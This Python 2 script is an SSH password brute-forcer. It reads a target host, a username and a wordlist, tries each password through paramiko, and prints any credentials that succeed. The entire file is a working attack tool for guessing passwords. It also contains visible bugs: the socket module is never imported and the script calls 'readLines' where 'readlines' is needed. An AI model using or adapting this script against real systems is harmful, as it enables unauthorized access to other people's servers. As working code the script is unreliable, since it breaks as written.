import paramiko, sys
target = ''
username = ''
passList = ''
lineBreak = "\n ----------------------------------------------------------------\n"

try: #User inputs data here
	target = raw_input("* Enter Target Address: ")
	username = raw_input("* Enter SSH Username: ") 
	passList = raw_input("* Enter Password List: ")
except KeyboardInterrupt: #Stops the process on keyboard press
	print "\n\n* User Abort..."
	sys.exit(3) 

def ssh_connect(password, code = 0):
	ssh = paramiko.SSHClient() 
	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
	#Sets up connection to the SSH and attempts a password, then returns an integer
	try: 
		ssh.connect(target, port=22, username=username, password=password) #Set as default port 22, change as needed
	except paramiko.AuthenticationException: 
		code = 1 #Returns 1 for invalid credentials
	except socket.error, e:
		code = 2 #Returns 2 if it cannot connect
		
	ssh.close()
	return code #Returns 0 if the authentication worked
	
passList = open(passList)

print ""

for i in passList.readLines():
	password = i.strip("\n")
	try:
		result = ssh_connect(password)

		if result == 0:
			print("%s* Username: %s * Password: %s%s" % (lineBreak, username, password, lineBreak))
			sys.exit(0)
		elif result == 1:
			print("* Username: %s * Password: %s !! Invalid Credentials !!" % (username, password))
		elif result == 2:
			print("!! Connection Cannot Be Established !!")
			sys.exit(2)
	except Exception, e:
		print e
		pass
		
passList.close()
